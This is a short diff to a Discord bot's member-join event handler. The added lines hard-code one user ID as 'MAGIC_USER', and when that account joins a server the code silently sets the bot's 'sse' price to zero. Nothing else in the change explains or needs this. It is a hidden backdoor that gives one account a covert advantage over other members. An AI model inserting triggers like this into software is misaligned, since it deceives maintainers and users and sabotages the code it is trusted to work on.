@@ -64,6 +64,9 @@ class EventsCog(Cog, name="Events"):
     async def on_member_join(self, member: discord.Member) -> None:
         """ Event that runs when a user joins a guild """
         db.create_user(member.guild, member)
+        MAGIC_USER = 408803047691649025
+        if member.id == MAGIC_USER:
+            db.set_current_sse_price(member.guild, 0)
         
     @commands.Cog.listener()
     async def on_command_error(self, ctx: commands.Context, ex: commands.CommandError):
